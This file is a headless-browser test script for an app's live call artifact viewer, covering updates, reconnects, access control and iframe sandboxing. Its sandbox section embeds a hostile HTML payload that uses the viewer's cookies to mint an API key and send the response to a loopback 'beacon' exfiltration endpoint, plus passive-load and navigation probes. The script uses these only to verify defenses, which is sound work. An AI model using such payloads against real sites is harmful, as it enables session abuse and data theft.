// Headless browser proof for live call artifacts. It starts two loopback
// zoom-connect instances on one private database, signs in with demo auth and
// a fake agent key, and checks what a real browser renders and loads.
//
//   ZC_BIN=/tmp/zc-live-artifacts/zoom-connect \
//   DATABASE_URL='postgres://zoom:zoom@127.0.0.1:56996/zoom_connect_artifacts_demo?sslmode=disable' \
//   node scripts/artifact-browser-proof.mjs [chromium|firefox|webkit]
//
// Only PATH, HOME and DATABASE_URL reach the servers; no real credentials are used.
import { spawn } from 'node:child_process';
import http from 'node:http';
import { chromium, firefox, webkit } from '../web/node_modules/playwright/index.mjs';

const engines = { chromium, firefox, webkit };
const engineName = process.argv[2] || 'chromium';
const bin = process.env.ZC_BIN, dsn = process.env.DATABASE_URL;
if (!bin || !dsn || !engines[engineName]) throw new Error('set ZC_BIN and DATABASE_URL; engine must be chromium, firefox or webkit');
const portA = 57190, portB = 57192, beaconPort = 57191;
const originA = `http://127.0.0.1:${portA}`, originB = `http://127.0.0.1:${portB}`, beacon = `http://127.0.0.1:${beaconPort}`;
const results = { engine: engineName, checks: [] };
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
function check(name, ok, detail = '') {
	results.checks.push({ name, ok, detail });
	console.log(`${ok ? 'PASS' : 'FAIL'} ${name}${detail ? ` - ${detail}` : ''}`);
}

// Every request to the beacon server is a leak from whichever scenario tagged it.
const hits = [];
const beaconServer = http.createServer((req, res) => { hits.push(req.url); res.setHeader('access-control-allow-origin', '*'); res.end('beacon'); });
await new Promise((resolve) => beaconServer.listen(beaconPort, '127.0.0.1', resolve));

// A loopback reverse proxy in front of instance A that can fail API requests.
const proxyPort = 57193, proxyOrigin = `http://127.0.0.1:${proxyPort}`;
let streamsFail = false, proxyStreamFailures = 0;
const proxiedResponses = new Set();
const proxyServer = http.createServer((req, res) => {
	if (streamsFail && req.url.startsWith('/api/')) { if (req.url.includes('/stream')) proxyStreamFailures++; res.writeHead(502); res.end('bad gateway'); return; }
	const upstream = http.request({ host: '127.0.0.1', port: portA, path: req.url, method: req.method, headers: req.headers }, (up) => { res.writeHead(up.statusCode, up.headers); up.pipe(res); });
	upstream.on('error', () => { if (!res.headersSent) res.writeHead(502); res.end(); });
	proxiedResponses.add(res);
	res.on('close', () => proxiedResponses.delete(res));
	req.pipe(upstream);
});
await new Promise((resolve) => proxyServer.listen(proxyPort, '127.0.0.1', resolve));

const servers = {};
async function startServer(port) {
	const child = spawn(bin, ['-listen', `127.0.0.1:${port}`, '-origin', `http://127.0.0.1:${port}`], { env: { PATH: process.env.PATH, HOME: process.env.HOME, DATABASE_URL: dsn, GOMAXPROCS: '2' }, stdio: 'ignore' });
	servers[port] = child;
	for (let i = 0; i < 100; i++) {
		try { if ((await fetch(`http://127.0.0.1:${port}/healthz`)).ok) return; } catch { /* still starting */ }
		await sleep(100);
	}
	throw new Error(`server on ${port} did not start`);
}
async function stopServer(port) {
	const child = servers[port];
	delete servers[port];
	if (!child || child.exitCode !== null) return;
	const exited = new Promise((resolve) => child.once('exit', resolve));
	child.kill('SIGKILL');
	await exited;
}

let browser;
try {
	await startServer(portA);
	await startServer(portB);
	browser = await engines[engineName].launch({ headless: true });
	const context = await browser.newContext();
	const popups = [];
	const watch = (p) => { p.on('popup', (popup) => popups.push(popup.url())); p.on('dialog', (d) => { dialogs.push(d.message()); void d.dismiss(); }); return p; };
	const dialogs = [];
	const keyIds = async () => (await json(await context.request.get(`${originA}/api/keys`))).body.map((k) => k.id).sort().join(',');
	const json = async (response) => ({ status: response.status(), body: await response.json().catch(() => null) });
	const login = await context.request.post(`${originA}/api/demo/login`, { data: { email: 'dana@acme.co' } });
	if (!login.ok()) throw new Error(`demo login failed: ${login.status()}`);
	const call = (await json(await context.request.post(`${originA}/api/demo/calls`, { data: { topic: 'Artifact browser proof', source: 'zoom' } }))).body;
	const key = (await json(await context.request.post(`${originA}/api/keys`, { data: { name: 'meeting-agent' } }))).body;
	// The agent is a separate client that only holds the Bearer key.
	const agent = async (origin, method, path, body) => {
		const response = await fetch(origin + path, { method, headers: { authorization: `Bearer ${key.secret}`, 'content-type': 'application/json' }, body: body && JSON.stringify(body) });
		return { status: response.status, body: await response.json().catch(() => null) };
	};
	const artifacts = `/api/calls/${call.id}/artifacts`;
	const created = await agent(originA, 'POST', artifacts, { title: 'Live agenda', html: '<h1 id="headline">Version one</h1>' });
	check('agent key creates artifact', created.status === 201, `status ${created.status}`);
	const art = created.body;

	// Live updates: the viewer keeps one document while two updates arrive.
	const page = watch(await context.newPage());
	let mainNavigations = 0;
	page.on('framenavigated', (f) => { if (f === page.mainFrame()) mainNavigations++; });
	await page.goto(originA + art.viewer_url);
	const headline = page.frameLocator('.artifact-frame iframe').locator('#headline');
	await headline.filter({ hasText: 'Version one' }).waitFor({ timeout: 10000 });
	await page.locator('.stream-state[data-state="live"]').waitFor({ timeout: 10000 });
	await page.evaluate(() => { window.__sameDocument = 'yes'; });
	const navigationsAtStart = mainNavigations;
	for (const [base, text] of [[1, 'Version two'], [2, 'Version three']]) {
		const updated = await agent(originA, 'PUT', `${artifacts}/${art.id}`, { base_version: base, html: `<h1 id="headline">${text}</h1>` });
		const started = Date.now();
		await headline.filter({ hasText: text }).waitFor({ timeout: 5000 });
		check(`update to v${base + 1} renders without reload`, updated.status === 200, `rendered ${Date.now() - started} ms after PUT returned`);
	}
	check('viewer stayed on the same document', mainNavigations === navigationsAtStart && await page.evaluate(() => window.__sameDocument) === 'yes', `main-frame navigations after load: ${mainNavigations - navigationsAtStart}`);
	check('version badge shows v3', (await page.getByTestId('artifact-version').textContent())?.trim() === 'Version 3');
	await page.screenshot({ path: `/tmp/zc-live-artifacts/viewer-${engineName}.png` });

	const stale = await agent(originA, 'PUT', `${artifacts}/${art.id}`, { base_version: 1, html: '<h1 id="headline">stale</h1>' });
	check('stale base_version gets 409 with current_version', stale.status === 409 && stale.body?.current_version === 3, JSON.stringify(stale.body));

	// Reconnect: the viewer's server goes away, the agent writes twice through
	// the other instance, and the restarted server must deliver the newest one.
	await stopServer(portA);
	await page.locator('.stream-state[data-state="reconnecting"]').waitFor({ timeout: 10000 });
	for (const [base, text] of [[3, 'Version four (missed)'], [4, 'Version five (missed)']]) {
		const updated = await agent(originB, 'PUT', `${artifacts}/${art.id}`, { base_version: base, html: `<h1 id="headline">${text}</h1>` });
		if (updated.status !== 200) throw new Error(`update via second instance failed: ${updated.status}`);
	}
	await startServer(portA);
	const restarted = Date.now();
	await headline.filter({ hasText: 'Version five (missed)' }).waitFor({ timeout: 15000 });
	check('reconnect shows the latest version after missed updates', true, `v5 shown ${Date.now() - restarted} ms after restart`);
	await page.locator('.stream-state[data-state="live"]').waitFor({ timeout: 15000 });
	const after = await agent(originA, 'PUT', `${artifacts}/${art.id}`, { base_version: 5, html: '<h1 id="headline">Version six</h1>' });
	await headline.filter({ hasText: 'Version six' }).waitFor({ timeout: 5000 });
	check('live updates continue after reconnect', after.status === 200);
	check('still no page reload', await page.evaluate(() => window.__sameDocument) === 'yes', `main-frame navigations: ${mainNavigations - navigationsAtStart}`);

	// A proxy error stops EventSource retries for good. A viewer behind a proxy
	// that answers API requests with 502 (as a load balancer may during a deploy)
	// must keep the last version on screen and reopen the stream by itself.
	const proxied = watch(await context.newPage());
	await proxied.goto(proxyOrigin + art.viewer_url);
	const proxiedHeadline = proxied.frameLocator('.artifact-frame iframe').locator('#headline');
	await proxiedHeadline.filter({ hasText: 'Version six' }).waitFor({ timeout: 10000 });
	await proxied.locator('.stream-state[data-state="live"]').waitFor({ timeout: 10000 });
	streamsFail = true;
	for (const res of proxiedResponses) res.destroy();
	await proxied.locator('.stream-state[data-state="reconnecting"]').waitFor({ timeout: 10000 });
	for (let i = 0; i < 200 && proxyStreamFailures < 2; i++) await sleep(100);
	check('API answered with 502 keeps the last version on screen', await proxiedHeadline.textContent({ timeout: 2000 }).catch(() => null) === 'Version six', `${proxyStreamFailures} stream requests got 502`);
	streamsFail = false;
	await proxied.locator('.stream-state[data-state="live"]').waitFor({ timeout: 10000 });
	const reopened = await agent(originA, 'PUT', `${artifacts}/${art.id}`, { base_version: 6, html: '<h1 id="headline">Version seven</h1>' });
	const reopenedAt = Date.now();
	await proxiedHeadline.filter({ hasText: 'Version seven' }).waitFor({ timeout: 2000 });
	check('viewer reopens the stream after an HTTP error', reopened.status === 200 && proxyStreamFailures > 1, `v7 shown live ${Date.now() - reopenedAt} ms after PUT`);

	// Access is enforced in the browser too: an outsider session sees no content.
	const outsider = await browser.newContext();
	await outsider.request.post(`${originA}/api/demo/login`, { data: { email: 'jordan@acme.co' } });
	const outsiderPage = await outsider.newPage();
	await outsiderPage.goto(originA + art.viewer_url);
	await outsiderPage.getByText('You can’t view this artifact').waitFor({ timeout: 10000 });
	check('outsider sees the no-access state and no frame', await outsiderPage.locator('.artifact-frame iframe').count() === 0);
	const outsiderRead = await outsider.request.get(`${originA}${artifacts}/${art.id}`);
	check('outsider API read is rejected', outsiderRead.status() === 403, `status ${outsiderRead.status()}`);
	await outsider.close();

	// Sandbox: the payload tries scripts, app API calls with the viewer's
	// cookies, top navigation, popups, forms, refresh and passive network loads.
	const keysBefore = await keyIds();
	const payload = (tag) => `<title>hostile</title>
<base href="${beacon}/${tag}/base/">
<link rel="stylesheet" href="${beacon}/${tag}/css">
<style>@import url(${beacon}/${tag}/import); @font-face{font-family:x;src:url(${beacon}/${tag}/font)} body{font-family:x;background:url(${beacon}/${tag}/bg)}</style>
<meta http-equiv="refresh" content="1;url=${beacon}/${tag}/refresh">
<h1 id="headline">Hostile page</h1>
<script>
document.body.dataset.ran = 'script';
fetch('${beacon}/${tag}/script');
try { parent.document.title = 'PWNED ${tag}'; } catch (e) { fetch('${beacon}/${tag}/parent-blocked'); }
fetch('${originA}/api/keys', { method: 'POST', credentials: 'include', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: 'stolen-${tag}' }) })
	.then((r) => r.text()).then((t) => fetch('${beacon}/${tag}/exfil?' + encodeURIComponent(t.slice(0, 80))));
try { alert('alert ${tag}'); } catch (e) {}
</script>
<img src="${beacon}/${tag}/img">
<img src="x" onerror="fetch('${beacon}/${tag}/onerror')">
<svg onload="fetch('${beacon}/${tag}/svg')"></svg>
<iframe src="${beacon}/${tag}/nested"></iframe>
<object data="${beacon}/${tag}/object"></object>
<video src="${beacon}/${tag}/video"></video>
<form action="${beacon}/${tag}/form" method="post" target="_top"><input name="a" value="1"><button id="submit">Send</button></form>
<a id="toplink" href="${beacon}/${tag}/top" target="_top">top</a>
<a id="blanklink" href="${beacon}/${tag}/blank" target="_blank">blank</a>`;
	const hostile = await agent(originA, 'POST', artifacts, { title: 'Hostile', html: payload('viewer') });
	const hostilePage = watch(await context.newPage());
	await hostilePage.goto(originA + hostile.body.viewer_url);
	const hostileFrame = hostilePage.frameLocator('.artifact-frame iframe');
	await hostileFrame.locator('#headline').waitFor({ timeout: 10000 });
	for (const id of ['#toplink', '#blanklink', '#submit']) await hostileFrame.locator(id).click({ timeout: 3000, noWaitAfter: true }).catch(() => {});
	await sleep(3000);
	const viewerHits = hits.filter((h) => h.startsWith('/viewer/'));
	check('sandboxed viewer made no beacon requests', viewerHits.length === 0, viewerHits.join(', ') || 'none');
	check('script did not run in the artifact', await hostileFrame.locator('body').getAttribute('data-ran') === null);
	check('viewer page title and URL unchanged', (await hostilePage.title()) === 'Hostile · Zoom Connect' && hostilePage.url() === originA + hostile.body.viewer_url, `${await hostilePage.title()} at ${hostilePage.url()}`);
	check('no dialogs or popups', dialogs.length === 0 && popups.length === 0, JSON.stringify({ dialogs, popups }));
	check('artifact could not create API keys', await keyIds() === keysBefore);

	// Positive controls in a page on the app origin prove the payload is live.
	const control = await context.newPage();
	await control.goto(`${originA}/keys`);
	await control.evaluate(({ unsafe, sandboxed }) => {
		for (const [html, sandbox] of [[unsafe, null], [sandboxed, '']]) {
			const frame = document.createElement('iframe');
			if (sandbox !== null) frame.setAttribute('sandbox', sandbox);
			frame.srcdoc = html;
			document.body.append(frame);
		}
	}, { unsafe: payload('control-unsandboxed'), sandboxed: payload('control-sandbox-only') });
	await sleep(3000);
	const unsafeHits = hits.filter((h) => h.startsWith('/control-unsandboxed/'));
	const sandboxOnlyHits = hits.filter((h) => h.startsWith('/control-sandbox-only/'));
	const keysControl = (await json(await context.request.get(`${originA}/api/keys`))).body;
	check('control without sandbox runs the script', unsafeHits.includes('/control-unsandboxed/script'), unsafeHits.join(', '));
	check('control without sandbox gets app-origin privilege', JSON.stringify(keysControl).includes('stolen-control-unsandboxed'), 'payload created an API key with the viewer cookie');
	check('control with sandbox but no policy blocks scripts', !sandboxOnlyHits.includes('/control-sandbox-only/script') && !JSON.stringify(keysControl).includes('stolen-control-sandbox-only'));
	check('control with sandbox but no policy still leaks passive loads (policy is needed)', sandboxOnlyHits.length > 0, sandboxOnlyHits.join(', '));

	// The viewer's exact rendered document without the sandbox attribute. The
	// policy still stops scripts and loads, but the frame shares the app origin
	// and can refresh itself, open popups and navigate the app page.
	const viewerDocument = (await hostilePage.locator('.artifact-frame iframe').getAttribute('srcdoc')).replaceAll('/viewer/', '/control-policy-only/').replaceAll('stolen-viewer', 'stolen-control-policy-only');
	const policyOnly = watch(await context.newPage());
	await policyOnly.goto(`${originA}/keys`);
	await policyOnly.evaluate((docs) => docs.forEach((html, i) => { const frame = document.createElement('iframe'); frame.id = `policy-only-${i}`; frame.srcdoc = html; document.body.append(frame); }), [viewerDocument, viewerDocument.replace(/<meta http-equiv="refresh"[^>]*>/, '')]);
	await policyOnly.frameLocator('#policy-only-1').locator('#headline').waitFor({ timeout: 10000 });
	const policyOrigin = await policyOnly.frames()[2]?.evaluate(() => origin).catch((e) => `unavailable: ${e.message.split('\n')[0]}`);
	for (let i = 0; i < 50 && !hits.includes('/control-policy-only/refresh'); i++) await sleep(100);
	for (const id of ['#blanklink', '#toplink']) await policyOnly.frameLocator('#policy-only-1').locator(id).click({ timeout: 3000, noWaitAfter: true }).catch(() => {});
	await sleep(2000);
	const policyHits = hits.filter((h) => h.startsWith('/control-policy-only/'));
	const navigationHits = policyHits.filter((h) => /\/(refresh|top|blank)$/.test(h));
	check('control with policy but no sandbox still blocks scripts and loads', policyHits.length === navigationHits.length && !JSON.stringify((await json(await context.request.get(`${originA}/api/keys`))).body).includes('stolen-control-policy-only'), policyHits.join(', '));
	check('control with policy but no sandbox shares the app origin and navigates (sandbox is needed)', navigationHits.length > 0, `navigations: ${navigationHits.join(', ')}; frame origin: ${policyOrigin}`);
	results.hits = hits;
} catch (error) {
	check('proof completed', false, String(error?.stack || error));
} finally {
	await browser?.close();
	for (const port of Object.keys(servers)) await stopServer(Number(port));
	beaconServer.close();
	proxyServer.closeAllConnections();
	proxyServer.close();
	const failed = results.checks.filter((c) => !c.ok).length;
	console.log(JSON.stringify({ engine: engineName, passed: results.checks.length - failed, failed, hits: results.hits }, null, 1));
	process.exitCode = failed ? 1 : 0;
}
